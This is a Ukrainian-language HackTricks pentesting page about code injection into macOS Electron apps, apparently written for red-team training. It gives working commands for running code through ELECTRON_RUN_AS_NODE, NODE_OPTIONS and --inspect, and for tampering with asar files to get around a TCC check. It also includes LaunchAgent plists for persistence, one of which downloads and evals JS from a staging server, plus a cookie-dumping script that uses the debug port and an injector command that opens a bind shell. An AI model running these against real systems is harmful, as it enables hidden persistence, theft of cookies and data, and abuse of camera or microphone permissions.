# Впровадження додатків Electron для macOS

{% hint style="success" %}
Вивчайте та практикуйте хакінг AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Навчання HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте хакінг GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Навчання HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}

## Основна інформація

Якщо ви не знаєте, що таке Electron, ви можете знайти [**багато інформації тут**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Але наразі просто знайте, що Electron запускає **node**.\
І у node є деякі **параметри** та **змінні середовища**, які можна використовувати для **виконання іншого коду**, крім вказаного файлу.

### Електронні плавки

Ці техніки будуть обговорені далі, але останнім часом Electron додав кілька **прапорців безпеки для їх запобігання**. Це [**Електронні плавки**](https://www.electronjs.org/docs/latest/tutorial/fuses), які використовуються для **запобігання** додаткам Electron в macOS від **завантаження довільного коду**:

* **`RunAsNode`**: Якщо відключено, це запобігає використанню змінної середовища **`ELECTRON_RUN_AS_NODE`** для впровадження коду.
* **`EnableNodeCliInspectArguments`**: Якщо відключено, параметри, такі як `--inspect`, `--inspect-brk`, не будуть враховуватися. Цим способом уникнуто впровадження коду.
* **`EnableEmbeddedAsarIntegrityValidation`**: Якщо ввімкнено, завантажений **`asar`** **файл** буде **перевірений** macOS. Таким чином запобігається **впровадженню коду** шляхом зміни вмісту цього файлу.
* **`OnlyLoadAppFromAsar`**: Якщо це ввімкнено, замість пошуку для завантаження в такому порядку: **`app.asar`**, **`app`** і, нарешті, **`default_app.asar`**. Він буде перевіряти та використовувати лише app.asar, тим самим забезпечуючи, що при **комбінуванні** з плавкою **`embeddedAsarIntegrityValidation`** неможливо **завантажити неперевірений код**.
* **`LoadBrowserProcessSpecificV8Snapshot`**: Якщо ввімкнено, процес браузера використовує файл з назвою `browser_v8_context_snapshot.bin` для свого знімка V8.

Ще одна цікава плавка, яка не буде запобігати впровадженню коду:

* **EnableCookieEncryption**: Якщо ввімкнено, сховище файлів cookie на диску шифрується за допомогою ключів криптографії рівня ОС.

### Перевірка Електронних Плавок

Ви можете **перевірити ці прапорці** з додатка за допомогою:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Зміна Електронних Плавок

Як зазначено в [**документації**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), конфігурація **Електронних Плавок** налаштовується всередині **бінарного файлу Електрона**, який містить десь рядок **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

У додатках для macOS це зазвичай знаходиться в `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Ви можете завантажити цей файл на [https://hexed.it/](https://hexed.it/) та знайти попередній рядок. Після цього рядка ви можете побачити у коду ASCII число "0" або "1", що вказує, чи вимкнені або увімкнені кожен плавник. Просто змініть шістнадцятковий код (`0x30` - це `0`, а `0x31` - це `1`) для **зміни значень плавників**.

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу, що якщо ви спробуєте **перезаписати** **бінарний файл Electron Framework** всередині додатка зі зміненими байтами, додаток не запуститься.

## RCE додавання коду до додатків Electron

Можуть бути **зовнішні файли JS/HTML**, які використовує додаток Electron, тому зловмисник може впровадити код у ці файли, підпис яких не буде перевірений, та виконати довільний код в контексті додатка.

{% hint style="danger" %}
Однак на даний момент є 2 обмеження:

* Для модифікації додатка потрібно дозвіл **`kTCCServiceSystemPolicyAppBundles`**, тому за замовчуванням це більше не можливо.
* Скомпільований файл **`asap`** зазвичай має плавники **`embeddedAsarIntegrityValidation`** та **`onlyLoadAppFromAsar`**, які увімкнені

Це ускладнює (або робить неможливим) цей шлях атаки.
{% endhint %}

Зверніть увагу, що можливо обійти вимогу **`kTCCServiceSystemPolicyAppBundles`**, скопіювавши додаток в інший каталог (наприклад, **`/tmp`**), перейменувавши папку **`app.app/Contents`** на **`app.app/NotCon`**, **змінивши** файл **asar** за вашим **зловмисним** кодом, знову перейменувавши його на **`app.app/Contents`** та виконавши його.

Ви можете розпакувати код з файлу asar за допомогою:
```bash
npx asar extract app.asar app-decomp
```
І запакуйте його назад після внесення змін за допомогою:
```bash
npx asar pack app-decomp app-new.asar
```
## Виконання коду з `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Згідно з [**документацією**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), якщо ця змінна середовища встановлена, вона запустить процес як звичайний процес Node.js.
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Якщо функція **`RunAsNode`** вимкнена, змінна середовища **`ELECTRON_RUN_AS_NODE`** буде ігноруватися, і це не спрацює.
{% endhint %}

### Впровадження з файлу Plist додатка

Як було [**запропоновано тут**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), ви можете зловживати цією змінною середовища в plist для збереження постійності:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE з `NODE_OPTIONS`

Ви можете зберегти вразливість у різному файлі та виконати її:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Якщо плавка **`EnableNodeOptionsEnvironmentVariable`** вимкнена, додаток **ігноруватиме** змінну середовища **NODE\_OPTIONS** при запуску, якщо змінна середовища **`ELECTRON_RUN_AS_NODE`** не встановлена, що також буде **ігноруватися**, якщо плавка **`RunAsNode`** вимкнена.

Якщо ви не встановите **`ELECTRON_RUN_AS_NODE`**, ви отримаєте **помилку**: `Більшість NODE_OPTIONs не підтримуються в упакованих додатках. Див. документацію для отримання додаткової інформації.`
{% endhint %}

### Впровадження з файлу Plist додатка

Ви можете зловживати цією змінною середовища в файлі Plist для збереження постійності, додавши ці ключі:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## ВПК з інспектуванням

Згідно з [**цим**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), якщо ви запускаєте додаток Electron з прапорцями, такими як **`--inspect`**, **`--inspect-brk`** та **`--remote-debugging-port`**, буде відкритий **порт для налагодження**, до якого ви зможете підключитися (наприклад, з Chrome за адресою `chrome://inspect`) і ви зможете **впроваджувати код в нього** або навіть запускати нові процеси.\
Наприклад:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Якщо плавник **`EnableNodeCliInspectArguments`** вимкнено, додаток **ігноруватиме параметри вузла** (такі як `--inspect`) при запуску, якщо змінна середовища **`ELECTRON_RUN_AS_NODE`** не встановлена, яка також буде **ігноруватися**, якщо плавник **`RunAsNode`** вимкнено.

Однак ви все ще можете використовувати **параметр електрону `--remote-debugging-port=9229`**, але попередній вантаж не буде працювати для виконання інших процесів.
{% endhint %}

Використовуючи параметр **`--remote-debugging-port=9222`**, можна вкрасти деяку інформацію з додатка Electron, таку як **історію** (з командами GET) або **куки** браузера (оскільки вони **розшифровуються** всередині браузера, і є **кінцева точка json**, яка їх надасть).

Ви можете дізнатися, як це зробити [**тут**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) і [**тут**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) та використовувати автоматичний інструмент [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) або простий скрипт, подібний до:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
У [**цьому блозі**](https://hackerone.com/reports/1274695), це використовується для виклику налагодження, щоб зробити headless chrome **завантаження довільних файлів у довільні місця**.

### Впровадження з файлу Plist додатка

Ви можете використовувати цю змінну середовища в файлі plist для збереження постійності, додаючи ці ключі:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Обхід TCC за допомогою старих версій

{% hint style="success" %}
Демон TCC з macOS не перевіряє виконувану версію додатка. Тому, якщо ви **не можете впровадити код в електронний додаток** жодним із попередніх методів, ви можете завантажити попередню версію ДОДАТКА та впровадити код в нього, оскільки він все ще отримає привілеї TCC (якщо кеш довіри не запобігає цьому).
{% endhint %}

## Запуск не JS-коду

Попередні методи дозволять вам виконувати **JS-код у процесі електронного додатка**. Однак пам'ятайте, що **дочірні процеси працюють під тим самим профілем пісочниці**, що і батьківський додаток, та **успадковують їх дозволи TCC**.\
Отже, якщо ви хочете зловживати дозволами для доступу до камери або мікрофона, наприклад, ви можете просто **запустити інший виконуваний файл з процесу**.

## Автоматичне впровадження

Інструмент [**electroniz3r**](https://github.com/r3ggi/electroniz3r) може бути легко використаний для **пошуку вразливих електронних додатків**, встановлених на комп'ютері, та впровадження коду в них. Цей інструмент спробує використати техніку **`--inspect`**:

Вам потрібно скомпілювати його самостійно та використовувати його таким чином:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Посилання

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{% hint style="success" %}
Вивчайте та практикуйте взлом AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Навчання HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте взлом GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Навчання HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}
